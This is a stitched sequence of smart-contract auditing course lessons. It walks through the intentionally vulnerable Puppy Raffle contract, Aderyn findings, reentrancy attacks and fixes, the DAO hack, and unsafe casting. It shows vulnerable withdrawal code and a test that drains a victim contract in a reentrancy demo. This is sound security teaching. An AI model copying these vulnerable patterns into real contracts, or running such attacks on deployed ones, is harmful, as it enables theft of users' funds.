- Found in src/PuppyRaffle.sol [Line: 168](src/PuppyRaffle.sol#L168)

  ```solidity
          feeAddress = newFeeAddress;
  ```

## NC-2: Functions not used internally could be marked external

- Found in src/PuppyRaffle.sol [Line: 79](src/PuppyRaffle.sol#L79)

  ```solidity
      function enterRaffle(address[] memory newPlayers) public payable {
  ```

- Found in src/PuppyRaffle.sol [Line: 96](src/PuppyRaffle.sol#L96)

  ```solidity
      function refund(uint256 playerIndex) public {
  ```

- Found in src/PuppyRaffle.sol [Line: 189](src/PuppyRaffle.sol#L189)

  ```solidity
      function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
  ```

## NC-3: Constants should be defined and used instead of literals

- Found in src/PuppyRaffle.sol [Line: 86](src/PuppyRaffle.sol#L86)

  ```solidity
          for (uint256 i = 0; i < players.length - 1; i++) {
  ```

- Found in src/PuppyRaffle.sol [Line: 87](src/PuppyRaffle.sol#L87)

  ```solidity
              for (uint256 j = i + 1; j < players.length; j++) {
  ```

- Found in src/PuppyRaffle.sol [Line: 127](src/PuppyRaffle.sol#L127)

  ```solidity
          require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
  ```

- Found in src/PuppyRaffle.sol [Line: 132](src/PuppyRaffle.sol#L132)

  ```solidity
          uint256 prizePool = (totalAmountCollected * 80) / 100;
  ```

- Found in src/PuppyRaffle.sol [Line: 133](src/PuppyRaffle.sol#L133)

  ```solidity
          uint256 fee = (totalAmountCollected * 20) / 100;
  ```

- Found in src/PuppyRaffle.sol [Line: 139](src/PuppyRaffle.sol#L139)

  ```solidity
          uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
  ```

## NC-4: Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

- Found in src/PuppyRaffle.sol [Line: 53](src/PuppyRaffle.sol#L53)

  ```solidity
      event RaffleEnter(address[] newPlayers);
  ```

- Found in src/PuppyRaffle.sol [Line: 54](src/PuppyRaffle.sol#L54)

  ```solidity
      event RaffleRefunded(address player);
  ```

- Found in src/PuppyRaffle.sol [Line: 55](src/PuppyRaffle.sol#L55)

  ```solidity
      event FeeAddressChanged(address newFeeAddress);
  ```



---

_**WOW!**_ We have a report of vulnerabilities already gorgeously formatted and ready to be added to our audit report.

### Wrap Up

Fast, and efficient, [**Aderyn**](https://github.com/Cyfrin/aderyn) offers a swift vulnerability report of your smart contracts which is almost ready to be presented. Aesthetically neat and structurally organized, the tool is a quick starter for anyone performing security reviews. We'll be leveraging the poweer of Aderyn throughout the course!.

Let's look at one more tool briefly in the next lesson.
---
title: Answering Our Questions
---

_Follow along with this video:_

---

### Answering Our Questions

This lesson will be a little unconventional. I'm going to list some of the questions that were raised as we performed our recon on Puppy Raffle. I want you to challenge yourself to answer these questions, then compare to my answers below!

Questions:

```js
// Q1: What resets the players array?

// Q2: What if enterRaffle is called with an empty array?

// Q3: In the case of getActivePlayerIndex - what if the player is at Index 0?

// Q4: Does the selectWinner function follow CEI?

// Q5: Are raffleDuration and raffleStartTime being set correctly?

// Q6: Why not use address(this).balance for the totalAmountCollected in the selectWinner function?

// Q7: Is the 80% calculation for winners rewards correct?

// Q8: Where do we increment the totalSupply/tokenId?

// Q9: Can a user simply force the selectWinner function to revert if they don't like the results?

// Q10: What happens if the winner is a contract with broken or missing receive/fallback functions?

// Q11: What happens if the feeAddress is a contract with broken or missing receive/fallback functions?
```

---


Answers!

```js
// A1: The players array is reset in the selectWinner function.

...
delete players;
raffleStartTime = block.timestamp;
previousWinner = winner;
(bool success,) = winner.call{value: prizePool}("");
...

// A2: If an empty array is submitted, an event is still emitted by the function. This will likely go in our report.

...
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        ...
        emit RaffleEnter(newPlayers);
    }
...

// A3: A player at index zero, may believe they are not active in a raffle, as this function returns zero if a player is not found. This will also go in our report for sure.

...
function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
...

// A4: No, the selectWinner function doesn't follow CEI and we would recommend to the protocol that it does. However, I happen to know this isn't an issue in this function, so we might flag this as informational.

// A5: They are being set in the constructor and seem to be configured properly.

...
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;
...

// A6: This may be a design choice, but without clear rationale or a protocol to ask, we may flag this as informational for now.

// A7: Yes, as per the documentation, 80% should be sent to the winner with 20% being retained in fees.

// A8: This is handled by the OpenZeppelin ERC721.sol contract. Ultimately being set by this declaration when a winner is selected:

...
uint256 tokenId = totalSupply();
...

// A9: Yes! This will probably be an issue we'll want to add to our report.

// A10: The winner wouldn't be able to receive their reward! This is definitely something we should report as a vulnerability.

// A11: Sending funds to the feeAddress with the withdrawFees function will probably fail, but this is very low impact as the owner can simply change the feeAddress.
```


---
title: Reentrancy - Recap
---

_Follow along with this video:_

---

### Recap

At it's most minimalistic, a re-entrancy attack looks like this:



A reentrancy attack occurs when an attacker takes advantage of the recursive calling capability of a contract. By repeatedly calling a function within a contract, the attacker can withdraw funds or manipulate contract state before the initial function call is resolved, often leading to the theft of funds or other unintended consequences.

As a more indepth reference:



We learnt that re-entrancy is a _very_ common attack vector and walked through how to indentify and reproduce the vulnerability both in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and locally as well as how to test for them.


Re-entrancy Test Example

```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ReentrancyVictim, ReentrancyAttacker} from "../../src/reentrancy/Reentrancy.sol";

contract ReentrancyTest is Test {
    ReentrancyVictim public victimContract;
    ReentrancyAttacker public attackerContract;

    address victimUser = makeAddr("victimUser");
    address attackerUser = makeAddr("attackerUser");

    uint256 amountToDeposited = 5 ether;
    uint256 attackerCapital = 1 ether;

    function setUp() public {
        victimContract = new ReentrancyVictim();
        attackerContract = new ReentrancyAttacker(victimContract);

        vm.deal(victimUser, amountToDeposited);
        vm.deal(attackerUser, attackerCapital);
    }

    function test_reenter() public {
        // User deposits 5 ETH
        vm.prank(victimUser);
        victimContract.deposit{value: amountToDeposited}();

        // We assert the user has their balance
        assertEq(victimContract.userBalance(victimUser), amountToDeposited);

        // // Normally, the user could now withdraw their money if they like
        // vm.prank(victimUser);
        // victimContract.withdrawBalance();

        // But... we get attacked!
        vm.prank(attackerUser);
        attackerContract.attack{value: 1 ether}();

        assertEq(victimContract.userBalance(victimUser), amountToDeposited);
        assertEq(address(victimContract).balance, 0);

        vm.prank(victimUser);
        vm.expectRevert();
        victimContract.withdrawBalance();
    }
}
```




Additionally, we learnt that `static analysis` tools like `Slither` can even catch this vulnerability (though not always)!

We also covered how to safeguard against this attack in at least two ways.

- Adhering to the CEI (Checks, Effects, Interactions) pattern, assuring we perform state changes _before_ making external calls.
- Implenting a nonReentrant modifier like one offered by [**OpenZeppellin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol).
- Applying a mutex lock to our function ourselves.

Mutex Lock Example

```js
bool locked = false;
function withdrawBalance() public {
    if(locked){
        revert;
    }
    locked = true;

    // Checks
    // Effects
    uint256 balance = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Interactions
    (bool success,) = msg.sender.call{value: balance}("");
    if (!success) {
        revert();
    }
    locked = false;
}
```




Lastly, we learnt how this problem still plagues us today. Through this [**repo**](https://github.com/pcaversaccio/reentrancy-attacks) managed by Pascal et al, we can see a horrifying list, 7 years long, of just this single attack vector. We also uncovered a case study in [**The DAO hack**](https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c) and saw just how severe this issue can be.

Armed with all of this knowledge, surely you will _never_ miss a re-entrancy attack again. Let's move onto the PoC.
---
title: Reentrancy - Mitigation
---

_Follow along with this video:_

---

Re-entrancy is a big deal! So, how do we fix this?

There are a few ways, the easiest of which is adhere to the CEI pattern.

### CEI Pattern

_What's a CEI pattern?_

I'm glad you asked!

CEI stands for Checks, Effects and Interactions and is a best practice for orders of operation.

1. Checks - require statements, conditions
2. Effects - this is where you update the state of the contract
3. Interactions - any interaction with external contracts/addresses come last

Let's look at this in the context of our `withdrawBalance` example.

```js
function withdrawBalance() public {
    // Checks
        /*None*/
    //Effects
    uint256 balance = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    //Interactions
    (bool success,) = msg.sender.call{value: balance}("");
    if (!success) {
        revert();
    }
}
```

Our function has no checks, but simply by reordering things this way, with our effects before interactions, we're guarded against re-entrancy. We can confirm this in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

### Remix Confirmation

First, let's make sure we've re-ordered things in our contract.



Now fund your victim contract and try calling the `attack` function with a second wallet address, as we did before.



It reverts! So, what's happening here?



### Alternative Mitigation

There is another popular way we can protect from re-entrancy and that's through a locking mechanism we could apply to this function.

This is also very simple to implement and would look something like this:

```js
bool locked = false;
function withdrawBalance() public {
    if(locked){
        revert;
    }
    locked = true;

    // Checks
    // Effects
    uint256 balance = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Interactions
    (bool success,) = msg.sender.call{value: balance}("");
    if (!success) {
        revert();
    }
    locked = false;
}
```

This is called a `mutex lock` in computing science. By applying the above logic, we lock the function once it's called so that it can't be re-entered while locked!

Along this line we also have the [**OpenZeppelin ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) library available to us. This effectively applies locks to our functions under the hood keeping our code clean and professional by leveraging the `nonReentrant` modifier.

### Wrap Up

That's it! We've learnt 3 simple ways to protect against re-entrancy vulnerabilities in our code.

1. Following CEI - Checks, Effects, Interactions Patterns
2. Implementing a locking mechanism to our function
3. Leveraging existing libraries from trust sources like [**OpenZeppelin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)

For such an easy vulnerability to protect against, re-entrancy continues to significantly impact the Web3 ecosystem. Let's take a specific look at how in the next lesson.
---
title: Recon - Reading Docs Continued
---

_Follow along with this video:_

---

### Back to `enterRaffle`

```js
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

Back to our `main entry point` function, we see it's using a require statement. Now, this contract is using `pragma 0.7.6`, so custom reverts may not have existed then - but this is a great example of a note we'd want to take and something we should check later.

```js
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle"); //@audit - Are custom reverts an option in 0.7.6?
    ...
}
```

A few additional details we notice as we traverse the function:

- Our require statement compares to `newPlayers.length` - _what happens if this is 0?_
- The `entranceFee` is an `immutable variable` - we can confirm this is initialized in the constructor.
- The raffle is keeping track of who has entered the raffle by pushing each index of `newPlayers[]` to `players[]`.

The last section of this function is finally our check for duplicates.

```js
// Check for duplicates
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

With experience you'll be able to _smell_ bugs. You'll see messy blocks of code like the above and your intuition is going to kick in.

Can you spot the bug🐛?

### Wrap Up

We've learnt SO MUCH from this single entry point of this contract. I hope you've been taking notes of what we uncover as we go. These protocol's we're going through may be small in scope - but they won't always be. Building strong organizational habits now will benefit you later on.

Next, let's take a look at a repo in which we've compiled simplified examples of common exploits, maybe we'll find the bug mentioned above!
---
title: CodeHawks
---

_Follow along with this video:_

---

### Getting Ready to Compete

With a better understanding of what a competitive audit is, I'll tell you - you have the skills _right now_ to start competing and start participating in some of these contests, especially First Flights.

Don't hesitate to jump in and get as much experience actually going through these processes as you can.

### Sign Up

Your first step, of course will be to sign up to CodeHawks and create an account. You can begin by clicking `Become a Hawk` on the [**CodeHawks Homepage**](https://www.codehawks.com/)



Connect the browser wallet of your choice when prompted and then fill out your profile information.



> **Note:** CodeHawks pays out on Arbitrum in USDC, so ensure you're using an EVM compatible wallet to receive rewards!

Once your details are entered, click the `Sign Up` button at the bottom, your wallet will pop up and you'll be prompted to sign a transaction (no fees).

You'll then receive a notification to verify your email, but following that **you're all done!** That's all it takes to get started with participating in competitive audits on the CodeHawks platform, and you already possess the basic skills to get involved.

Let's go over how to submit a finding in a competitive audit so you're truly prepared to jump in!
---
title: Aderyn Walkthrough
---

_Follow along with this video:_

---

### Aderyn Static Analysis

Next, let's see what `Aderyn` can do for the Puppy Raffle repo. We'll assess each of the findings in turn. Some of which will include:

- Centralization Risks
- Dynamic Types & abi.encodePacked
- Non-Indexed Events

We can start by running `aderyn .`. This should generate an already formatted markdown report for us. Once run, open `report.md`

### Aderyn Mediums

**1. Centralization Risk for Trusted Owners**

- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 180](src/PuppyRaffle.sol#L180)

      ```solidity
          function changeFeeAddress(address newFeeAddress) external onlyOwner {
      ```

  This vulnerability is likely to crop up more and more as time goes on, unfortunately. In the context of Puppy Raffle, we're going to ignore it, all the owner can really do is change the feeAddress. This is absolutely something that should be called out in private audits.

### Aderyn Lows

**1. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`**

- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 213](src/PuppyRaffle.sol#L213)

      ```solidity
                  abi.encodePacked(
      ```

      - Found in src/PuppyRaffle.sol [Line: 217](src/PuppyRaffle.sol#L217)

      ```solidity
                              abi.encodePacked(
      ```

  `Aderyn` here is pointing out that we should only use `encodePacked` for appropriate circumstances and that `encode` should be preferred to avoid hash collisions. We're going to ignore this for the purposes of this course, but I encourage you to investigate further to understand the reasoning here and find examples of hash collisions yourself.

**2. Solidity pragma should be specific, not wide**

- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

      ```solidity
      pragma solidity ^0.7.6;
      ```

  We got this one! This is the same as our `Floating Pragma` finding.

### Aderyn Informational/Gas

**1. Missing checks for `address(0)` when assigning values to address state variables**

- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

      ```solidity
              feeAddress = _feeAddress;
      ```

      - Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)

      ```solidity
              previousWinner = winner;
      ```

      - Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)

      ```solidity
              feeAddress = newFeeAddress;
      ```

  We got this one! `zero address checks` wil be a common topic in security reviews you do. Familiarize yourself with spotting them!

**2. Functions not used internally could be marked external**

- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 86](src/PuppyRaffle.sol#L86)

      ```solidity
          function enterRaffle(address[] memory newPlayers) public payable {
      ```

      - Found in src/PuppyRaffle.sol [Line: 105](src/PuppyRaffle.sol#L105)

      ```solidity
          function refund(uint256 playerIndex) public {
      ```

      - Found in src/PuppyRaffle.sol [Line: 205](src/PuppyRaffle.sol#L205)

      ```solidity
          function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
      ```

  Puppy Raffle has these function marked as `public`, which is _fine_, but if they aren't used internally as well as externally, we can just mark them as `external` for a small gas savings.

> **Note:** In the video, I assume this is referencing the `_getActivePlayer` function that is unused. Whoops!

**3. Constants should be defined and used instead of literals**

- Dangerous Calls - Found in src/PuppyRaffle.sol [Line: 94](src/PuppyRaffle.sol#L94)
  `solidity
    for (uint256 i = 0; i < players.length - 1; i++) {
    `

      - Found in src/PuppyRaffle.sol [Line: 96](src/PuppyRaffle.sol#L96)

      ```solidity
      for (uint256 j = i + 1; j < players.length; j++) {
      ```

      - Found in src/PuppyRaffle.sol [Line: 141](src/PuppyRaffle.sol#L141)

      ```solidity
      uint256 prizePool = (totalAmountCollected * 80) / 100;
      ```
      - Found in src/PuppyRaffle.sol [Line: 142](src/PuppyRaffle.sol#L142)

      ```solidity
          uint256 fee = (totalAmountCollected * 20) / 100;
      ```
      - Found in src/PuppyRaffle.sol [Line: 148](src/PuppyRaffle.sol#L148)

      ```solidity
          uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
      ```

  `Aderyn` was a little too vigilant here, catching the `Magic Numbers` used in our for loops, but it also caught a `Magic Numbers` in the `prizePool` and `fee` calculations as well! We got this one earlier.

**4. Event is missing `indexed` fields**

- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 59](src/PuppyRaffle.sol#L59)

      ```solidity
          event RaffleEnter(address[] newPlayers);
      ```

      - Found in src/PuppyRaffle.sol [Line: 60](src/PuppyRaffle.sol#L60)

      ```solidity
          event RaffleRefunded(address player);
      ```

      - Found in src/PuppyRaffle.sol [Line: 61](src/PuppyRaffle.sol#L61)

      ```solidity
          event FeeAddressChanged(address newFeeAddress);
      ```

  Indexing fields ultimately makes it easier for off-chain tools to access the emitted event data. Indexing event parameters costs more gas however, so there's a trade-off. Not using indexed fields could be defended as a design choice, but in an ideal world, they would be indexed.

### Wrap Up

That was quick! `Aderyn` is great in that this output is already formatted beautifully and we could reasonably just copy and paste it's finding into our report. Going through the outlined issues is a good practice however, as these static analysis tools paint with wide strokes and not everything caught may be applicable or valid.
---
title: Submitting a Competitive Audit Finding
---

_Follow along with this video:_

---

### Submitting a Competitive Audit Finding

We've come a long way in this guide, and now it's time to learn how to submit your findings in a CodeHawks competitive audit. As you follow along with me, remember that your write-ups need to demonstrate your skills and abilities as a security researcher. The better quality they are, the more chances you stand to earn additional rewards.

> **Note:** In this lesson we walkthrough submitting a finding in a CodeHawks First Flight. First Flights are held every two weeks generally, so if one isn't currently accepting submissions, be sure to come back!

Navigate to an active CodeHawks First Flight and click the link `Submit a Finding`.



Some of this should seem very familiar. We can enter a title and choose an appropriate severity.

- The title of a competitive audit submission can omit the [S-#] categorization. This will ultimately be prepended by judges if the report is deemed valid.
- Remember: a good title is comprised of Root Cause + Impact!

For `Relevant GitHub Links`, we're meant to provide a link, not just to the code base/contract, but to the specific lines we've identified as problematic. Using our DoS Vulnerability from `PuppyRaffle.sol` as an example, we can link directly to the loop in our `enterRaffle` function by right-clicking the line in GitHub and chooosing `copy permalink`.



Take some time to view the README of the First Flight you're looking at. You'll find important information for the contest available such as:

- Start/End dates and times
- Prize Distributions
- Audit Scope
- Compatibilities
- Roles

Now we reach the `Finding` section of the submission. You'll see a basic template provided to you. It's entirely acceptable to overwrite this template and paste the reports formatted as we've learnt so far into this field.

Once our write up looks good, we can even select `Preview` at the top to see what it looks like with formatting applied.

> **Note:** Proof of Concept/Code are nearly _mandatory_ to be considered a good submission.

Once you're satisfied with how things look, click `Submit Finding`. This should route you to `My Report` when you can see a summary of everything you've submitted for the audit so far. You can also make modifications to your submitted findings while the contest is open.

### The Selected Report

Something to always strive for is quality in the write ups you submit. In competitive audits submitting a finding that is a duplicate with other auditors is common. Platforms will reward an attention to submission quality by choosing a `selected report`. This reports represent the best quality write up for a given vulnerability and these reports receive _bonus payouts_.



### Wrap Up

Once a First Flight or Competitive Audit concludes, you'll be able to navitgate to `My Findings` in CodeHawks and download your submissions in markdown. It's worthwhile to add these to your portfolio to show your skills and experience to the world!

That's all there is to submitting to a competitive audit! From there a judge will take over. Be sure to sign up to CodeHawks, I promise you that participating in competitive audits and First Flights will supercharge your abilities as a security researcher.

Let's start finally writing things up in the next lesson!
---
title: Reentrancy - Menace to Society
---

_Follow along with this video:_

---

### Re-entrancy a Menace

Why am I stressing re-entrancy so much you might ask? The answer is simple.

- We've known about it since 2016
- It's easy enough to detect that static analyzers (like Slither) can identify them
- Web3 is still hit by millions of dollars in re-entrancy attacks per year.

This is so frustrating!

There's a [**GitHub Repo**](https://github.com/pcaversaccio/reentrancy-attacks) maintained by Pascal (legend) that catalogues re-entrancy attacks which have occured. I encourage you to look through these examples and really acquire a sense of the scope of the problem.

### Case Study: The DAO

[**The DAO**](https://en.wikipedia.org/wiki/The_DAO) was one of the most famous (or infamous) protocols in Web3 history. As of May 2016, its total value locked was ~14% of all ETH.

Unfortunately, it suffered from a re-entrancy vulnerability in two of its functions.

The first problem existed in the `splitDao` function, here's the vulnerable section and the whole contract for reference:

```js
contract DAO is DAOInterface, Token, TokenCreation {
    ...
    function splitDAO(
        uint _proposalID,
        address _newCurator
    ) noEther onlyTokenholders returns (bool _success) {

    Transfer(msg.sender, 0, balances[msg.sender]);
    withdrawRewardFor(msg.sender); // be nice, and get his rewards
    totalSupply -= balances[msg.sender];
    balances[msg.sender] = 0;
    paidOut[msg.sender] = 0;
    return true;
    }
}
```


Entire Contract

```js
contract DAO is DAOInterface, Token, TokenCreation {
    function splitDAO(
        uint _proposalID,
        address _newCurator
    ) noEther onlyTokenholders returns (bool _success) {        Proposal p = proposals[_proposalID];        // Sanity check        if (now < p.votingDeadline  // has the voting deadline arrived?
            //The request for a split expires XX days after the voting deadline
            || now > p.votingDeadline + splitExecutionPeriod
            // Does the new Curator address match?
            || p.recipient != _newCurator
            // Is it a new curator proposal?
            || !p.newCurator
            // Have you voted for this split?
            || !p.votedYes[msg.sender]
            // Did you already vote on another proposal?
            || (blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0) )  {
            throw;
        }        // If the new DAO doesn't exist yet, create the new DAO and store the
        // current split data
        if (address(p.splitData[0].newDAO) == 0) {
            p.splitData[0].newDAO = createNewDAO(_newCurator);
            // Call depth limit reached, etc.
            if (address(p.splitData[0].newDAO) == 0)
                throw;
            // should never happen
            if (this.balance < sumOfProposalDeposits)
                throw;
            p.splitData[0].splitBalance = actualBalance();
            p.splitData[0].rewardToken = rewardToken[address(this)];
            p.splitData[0].totalSupply = totalSupply;
            p.proposalPassed = true;
        }        // Move ether and assign new Tokens
        uint fundsToBeMoved =
            (balances[msg.sender] * p.splitData[0].splitBalance) /
            p.splitData[0].totalSupply;
        if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)
            throw;        // Assign reward rights to new DAO
        uint rewardTokenToBeMoved =
            (balances[msg.sender] * p.splitData[0].rewardToken) / p.splitData[0].totalSupply;        uint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /
            rewardToken[address(this)];        rewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved;
        if (rewardToken[address(this)] < rewardTokenToBeMoved)
            throw;
        rewardToken[address(this)] -= rewardTokenToBeMoved;        DAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved;
        if (DAOpaidOut[address(this)] < paidOutToBeMoved)
            throw;
        DAOpaidOut[address(this)] -= paidOutToBeMoved;        // Burn DAO Tokens
        Transfer(msg.sender, 0, balances[msg.sender]);
        withdrawRewardFor(msg.sender); // be nice, and get his rewards
        totalSupply -= balances[msg.sender];
        balances[msg.sender] = 0;
        paidOut[msg.sender] = 0;
        return true;
    }
}
```



---

Hopefully we can spot the problem above. The DAO was making external calls before updating its state!

This is seen again in the `withdrawRewardFor` function:

```js
contract DAO is DAOInterface, Token, TokenCreation {
    ...
    function withdrawRewardFor(address _account) noEther internal
        returns (bool _success) {
        if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])
            throw;        uint reward =
            (balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];
        if (!rewardAccount.payOut(_account, reward))
            throw;
        paidOut[_account] += reward;
        return true;
    }
}
```

---

An attack of this protocol in June 2016 resulted in the transfer of 3.8 Million Eth tokens and ultimately hardforked the Ethereum network in the recovery efforts.

You should absolutely read more about this attack [**here**](https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c).

### Wrap Up

Clearly re-entrancy plagues us to this day. Millions of dollars are lost every year. There are even new types of re-entrancy, such as `read-only re-entrancy` (which we'll cover more later).

The bottom line is - this is preventable.

Let's recap everything we've learnt about this vulnerability, in the next lesson.
---
title: Reentrancy - Remix Example
---

_Follow along with this video:_

---

### Re-entrancy Remix Example

The crux to this vulnerability lies in that we're updating the user's balance _last_.

```js
    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
```

The prevention of re-entrancy is actually very simple.

```js
function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];

        // State change
        userBalance[msg.sender] = 0;

        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
    }
```

That's it!

The first time this function is called now, the user's balance is updated to zero before making external calls. This means if an enternal call causes this function to be called again - the user's balance will already be updated as zero, so no further funds will be withdrawn.

Let's see this in action, in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

### Trying it Out

Once you're in remix with the re-entrancy examples open, begin by compiling and deploying both contracts.

_Be sure to deploy both contracts, first `ReentrancyVictim` then `ReentrancyAttacker`_



Both contracts should have 0 balance. Begin by having a sucker deposit 5 ether into `ReentrancyVictim` contract.



Now, change the account/wallet you're calling functions from (near the top). Our `ReentrancyAttacker::attack` function requires at least 1 ether. Once that's set and our attack function is called...



The attacker has made off with all of the protocol's ETH!

### Wrap Up

We've seen how impactful overlooked re-entrancy can be and we've seen it in action through remix. Our sc-exploits-minimized repo has some test suites included that will illustrate things locally as well. I encourage you to take a look at those and familiarize yourself with them between lessons if you want to learn more and build on your experience.

In the next lesson we'll approach how to safeguard ourselves and protocols from re-entrancy.
---
title: Unsafe Casting
---

_Follow along with this video:_

---

### Unsafe Casting Breakdown

There's another issue with the line `totalFees = totalFees + uint64(fee)` that's similar to integer overflow, but a little different.

Using `chisel` again, we can see that a max `uint64` is 18446744073709551615.

```bash
Welcome to Chisel! Type `!help` to show available commands.
➜ type(uint64).max
Type: uint
├ Hex: 0x000000000000000000000000000000000000000000000000ffffffffffffffff
└ Decimal: 18446744073709551615
➜
```

We've also learnt that adding any to this number is going to wrap around to 0 again, but what happens if we try to cast a larger number into this smaller container?



We can see above that when `20e18` is cast as a `uint64` the returned value is actually the difference between `type(uint64).max` and `20e18`.

Our value has wrapped on us again!

```js
// twentyEth         = 20000000000000000000
// type(uint64).max  = 18446744073709551615
// uint64(twenthEth) =  1553255926290448384
```

This is absolutely something we're caalling out in our audit report. Puppy Raffle is at risk of losing so many fees!
---
title: Phase 4 Reporting - Primer
---

_Follow along with this video:_

---

### Writing the Report

As was mentioned before - you can always look at one more line of code, but at some point, you got to _write the report_.

Now, we're satisfied with our review, we're happy with the job we did. Lets write things up. We're going to go through the report together again as this is a crucial skill for your future security researcher career.

In audits and especially in bug bounties, it is your obligation to convince the protocol of the importance of your finding and the need for it to be fixed. Writing detailed and thorough audit reports is the avenue through which we do this.

BUT. Before we walkthrough another report, I want to introduce you to competitive audits. We're going to go over what they are, how they differ from private audits and how to submit a finding for them.



---

For now - if you've been binging this course, I want you to pause and go for a walk. It's time to take a break and reward ourselves for how far we've come. We've learnt so much, and we've so much more to go.

See you after your break!
---
title: Recon - Reading the Code
---

_Follow along with this video:_

---

### Starting with the Code

What I like to do when first assessing a codebase is to start at the `main entry point`. Sometimes this area of a protocol may be a little unclear, but using Solidity: Metrics can help us out a lot.



Pay special attention to the functions marked `public` or `external`. Especially those which `modify state` or are `payable`. These are going to be certain potential attack vectors.

> **Note:** In Foundry you can use the command `forge inspect PuppyRaffle methods` to receive an output of methods for the contract.

I would start with the `enterRaffle` function. Let's take a look.

```js
/// @notice this is how players enter the raffle
/// @notice they have to pay the entrance fee * the number of players
/// @notice duplicate entrants are not allowed
/// @param newPlayers the list of players to enter the raffle
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

Starting with the `NatSpec` we may have a few questions rise.

- _What's meant by # of players?_
- _How does the function prevent duplicant entrants?_

Write questions like these in your `notes.md` or even as `@audit` notes inline. These are things we'll want to answer as we progress through the code.

###

One thing I notice in our next few lines is - I don't really love their naming conventions. `entranceFee` is immutable and nothing in this function makes that clear to me (unless I'm using [**Solidity Visual Developer**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor)).

